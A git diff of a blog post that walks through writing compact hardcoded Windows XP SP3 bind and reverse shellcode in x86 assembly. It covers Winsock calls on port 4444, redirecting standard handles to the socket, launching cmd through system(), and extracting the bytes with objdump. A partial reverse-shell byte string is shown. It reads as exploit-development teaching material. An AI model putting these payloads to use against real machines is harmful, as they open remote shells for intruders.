@@ -7,22 +7,24 @@ tags: [reverseshell, bindshell, hardcoded]
 comments: true
 ---
 
-This article is a walkthrough on how to write shellcodes for Windows, both reverse and bind. I assume the reader already have basic x86 Assembly and socket knowledge before reading further.  
-
-You will notice that the shellcodes presented in this article are respectively 92 (reverse) and 111 (bind) bytes long. You might be wondering why Windows shellcodes from msfvenom is about 300-400 bytes in comparison. This is because the payloads from msfvenom will work on any Windows version. It has extra code that will automatically find addresses for DLLs and system calls, which is different on every Windows release. The shellcodes in this article has hardcoded addresses, which will only work for one Windows version, which in this guide will be Windows XP SP3 (eng). Why not just stick to shellcodes from msfvenom? Most often you will have enough space for your payload and you can use a shellcode from msfvenom, but in some cases you won't have enough space, thus unless you find a small hardcoded shellcode, you need to create your own. If you are interesting in learning how to write shellcodes that automatically finds the necessary addresses, like those from msfvenom, you can read this amazing article: <a href="https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html">https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html</a>
+This article is a walkthrough on how to write shellcodes for Windows, both reverse and bind. I was doing the <a href="https://www.pentesteracademy.com/course?id=3">SLAE32</a> course from PentesterAcademy, which targets Linux, but I wanted to create shellcodes for Windows too. I found very little information about this online, but after much debugging, trying and failing I successfully made it. The shellcodes have been on my Github for a while, but I wanted to explain them more in detail, thus this article was created. Note that I assume the reader already have basic x86 Assembly and socket knowledge before reading further.  
+  
+You will notice that the shellcodes presented in this article are respectively 92 (reverse) and 111 (bind) bytes long. You might be wondering why Windows shellcodes from msfvenom is about 300-400 bytes in comparison. This is because the payloads from msfvenom will work on any Windows version. It has extra code that will automatically find addresses for DLLs and system calls, which is different on every Windows release. The shellcodes in this article has hardcoded addresses, which will only work for one Windows version, which in this guide will be Windows XP SP3 (eng). Why not just stick to shellcodes from msfvenom? Most often you will have enough space for your payload and you can use a shellcode from msfvenom, but in some cases you won't have enough space, thus unless you find a small hardcoded shellcode, you need to create your own. If you are interesting in learning how to write shellcodes that automatically finds the necessary addresses, like those from msfvenom, you can read this <a href="https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html">amazing article</a>.
 
 By the way, I'm no expert in Assembly and shellcoding. I have learned this just from reading articles, trying stuff and debugging. If you find something wrong, please let me know!
 
-# System calls and addresses
+# Prework: Finding system calls and addresses
 
 First off, we need to figure out the DLLs containing the system calls we need. Since we are going to create sockets, we already know that we need to use system calls, such as bind() and listen(). A quick Google search on "bind socket microsoft" gives us the following documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind">https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind</a>
 
-If we scroll down, we will see it mentions Ws2_32.dll. Now we can use the tool <a href="https://www.fuzzysecurity.com/tutorials/expDev/tools/arwin.rar">Arwin.exe</a> to figure out the address of the bind system call. On the target machine, open cmd.exe and type:
+If we scroll down, we will see it mentions Ws2_32.dll. Now we can use the tool <a href="https://www.fuzzysecurity.com/tutorials/expDev/tools/arwin.rar">Arwin.exe</a> to figure out the address of system calls.
 
 ```
 > arwin.exe ws2_32.dll bind
 arwin - win32 address resolution program - by steve hanna - v.01
 bind is located at 0x71ab4480 in ws2_32.dll
+```
+```
 > arwin.exe ws2_32.dll listen
 arwin - win32 address resolution program - by steve hanna - v.01
 listen is located at 0x71ab8cd3 in ws2_32.dll
@@ -60,21 +62,26 @@ msvcrt.dll:
   system()                77C293C7
 ```
 
-# Shellcoding
+# Shellcoding in general
 
-I won't go in depths about shellcoding in general here, but when you write shellcode for an exploit, you need to take certain precautions. For instance, hardcoding null bytes (0x00) will terminate strings and will most certain break the code. Also, you can't store strings like you would normally. Instead you can tricks, such as jmp-call-pop or pushing strings on the stack or to registers. I would recommend the course <a href="https://www.pentesteracademy.com/course?id=3">SLAE32 from PentesterAcademy</a> to get a deeper understanding of shellcoding.
+I won't go in depths about shellcoding in general here, but when you write shellcode for an exploit, you need to take certain precautions. For instance, hardcoding null bytes (0x00) will terminate strings and will most certain break the code. Also, you can't store strings like you would normally. Instead you can tricks, such as jmp-call-pop or pushing strings on the stack or to registers. I will explain where I do tricks to mitigate null bytes throughout the article.
 
-# Bindshell (port 4444)
+# Building the bindshell (port 4444)
 
+To create the bindshell, we will call a series of system calls, which we will go through below, against the Windows API. In case you are not familiar with Windows system calls, the basic idea is to fill up the stack with arguments before calling the function at the given address, referenced in the table created earlier.  
+  
 We want our first version of the shellcode to work as a standalone executable to better understand if it's working or not, before stripping away unnecessary parts. Also note that the size of the following shellcode can be reduced further, but I have purposely made it a little bigger for readability and flexibility. For example, pointers to strings are pushed on the stack instead of using the jmp-call-pop method to avoid jumps in the code.
 
-## LoadLibraryA(_In_ LPCTSTR lpFileName)
+## System call: LoadLibraryA
 
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya</a>
+Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya</a>
+
+Syntax:
+```
+LoadLibraryA(_In_ LPCTSTR lpFileName)
+```
 
 This system call loads a DLL file into the memory. It takes one argument, which is the name of the file.
-In case you are not familiar with Windows system calls, the basic idea is to fill up the stack with arguments before calling the function at the given address, referenced in the table created earlier.
-
 
 ```assembly
 xor eax, eax        ; Clear eax
@@ -111,10 +118,15 @@ This LoadLibraryA() system call is very straight forward. The stack looks like t
 -----------------------------------------
 ```
 
-## WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
+## System call: WSAStartup
 
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup">https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup</a>  
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata">https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata</a>
+Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup">https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup</a>  
+Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata">https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata</a>
+
+Syntax:
+```
+WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData)
+```
 
 The next system call we need to run is WSAStartup() to initialize the use of sockets. It takes two arguments, where the first is the version we are going to use and the second is a pointer to a place to store socket data.
 
@@ -135,9 +147,14 @@ nasm > sub esp, 0x190
 I'm not sure why this trick works, but by inverting the logic it works in our favor.
 `0xFFFFFFFF - 0xFFFFFE70 = 0x18F = 399`
 
-### WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
+## System call: WSASocketA
 
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa</a>
+Documnetation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa</a>
+
+Syntax:
+```
+WSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)
+```
 
 Now we need to create a socket. This function takes a few parameters, like information about the socket type. 
 
@@ -156,10 +173,15 @@ mov ebx, eax
 
 The pointer to the socket handler will be stored in eax, which we copy into ebx to reference later.
 
-## bind(SOCKET s, const sockaddr *addr, int namelen)
+## System call: bind
 
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind">https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind</a>  
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2">https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2</a>
+Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind">https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-bind</a>  
+Documnetation: <a href="https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2">https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2</a>
+
+Syntax:
+```
+bind(SOCKET s, const sockaddr *addr, int namelen)
+```
 
 Next up we need to bind the socket. The first argument is the pointer to the socket handler, which we have stored in EBX. In the second argument, we need to define three things: 
 + The port number, which in this case will be 4444 (0x5c11 in hex)
@@ -239,9 +261,14 @@ The stack looks like this right before calling bind():
 --------------------------------------------------------
 ```
 
-## listen(SOCKET s, int backlog)
+## System call: listen
 
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen</a>
+Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-listen</a>
+
+Syntax:
+```
+listen(SOCKET s, int backlog)
+```
 
 To get incoming connections, we need to call the listen() function, which is very simple to implement.
 
@@ -252,9 +279,14 @@ mov eax, 0x71AB8CD3  ; Address to listen()
 call eax
 ```
 
-### accept(SOCKET s, sockaddr *addr, int *addrlen)
+## System call: accept
 
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept</a>
+Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-accept</a>
+
+Syntax:
+```
+accept(SOCKET s, sockaddr *addr, int *addrlen)
+```
 
 As the docs says, "The accept function permits an incoming connection attempt on a socket". We need to store the return value here, which gets stored in EAX. We store a copy in EBX for later use.
 
@@ -270,9 +302,14 @@ mov ebx, eax         ; Store accept() handler
 
 Now finally we have the socket up and running. Time to implement the shell part.
 
-## SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle)
+## System call: SetStdHandle
 
 Docs: <a href="https://docs.microsoft.com/en-us/windows/console/setstdhandle">https://docs.microsoft.com/en-us/windows/console/setstdhandle</a>
+
+Syntax:
+```
+SetStdHandle(_In_ DWORD nStdHandle, _In_ HANDLE hHandle)
+```
 
 We will call this function three times to set STD_INPUT, STD_OUTPUT and STD_ERROR to the accepted socket connection.
 
@@ -292,9 +329,14 @@ push 0xfffffff4      ; Arg1 (nStdHandle) = -0C (STD_ERROR)
 call edx
 ```
 
-## system(const char *command)
+## System call: system
 
-Docs: <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2019">https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2019</a>
+Documentation: <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2019">https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=vs-2019</a>
+
+Syntax:
+```
+system(const char *command)
+```
 
 The final system call we need to call is the actual execution of OS commands. It takes one argument which is the a pointer to a command string. If you remember earlier, we had to deal with a filename string needed to be terminated with a null byte. Here we will also do some maneuvering to mitigate null bytes in the code.
 
@@ -483,7 +525,7 @@ $ nasm -f win32 bind.asm -o bind.o
 $ ld -m i386pe bind.o -o bind.exe
 ```
 
-### Test standalone executable
+### Verify standalone executable
 
 Simply double click on the executable and a cmd terminal will appear.  
 ![_config.yml]({{ site.baseurl }}/images/bindshell2.png)
@@ -514,13 +556,18 @@ $ for i in $(objdump -d shell.exe | grep "^ " | cut -f2); do echo -n '\x'$i; don
 111 bytes. No null bytes. Beautiful, isn't it?
 
 
-# Reverse shell (port 4444)
+# Building the reverse shell (port 4444)
 
 For the reverse shell, we will reuse a lot from the bind shell code. In fact, we are just going to replace bind(), listen() and accept() with connect(). 
 
-## connect(SOCKET s, const sockaddr *name, int namelen);
+## System call: connect
 
-Docs: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect</a>
+Documentation: <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect">https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect</a>
+
+Syntax:
+```
+connect(SOCKET s, const sockaddr *name, int namelen)
+```
 
 The connect system call connects to a socket. It takes three arguments and looks more or less like bind().
 
@@ -559,7 +606,6 @@ $ for i in $(objdump -d reverse.exe | grep "^ " | cut -f2); do echo -n '\x'$i; d
 \xf5\xff\xd2\x53\x6a\xf4\xff\xd2\xc7\x44\x24\xfb\x41\x63\x6d\x64\x8d\x44\x24\xfc
 \x8d\x64\x24\xfc\x50\xb8\xc7\x93\xc2\x77\xff\xd0
 ```
-
 
 Highly recommended read about shellcoding:
 <a href="http://www.hick.org/code/skape/papers/win32-shellcode.pdf">http://www.hick.org/code/skape/papers/win32-shellcode.pdf</a>
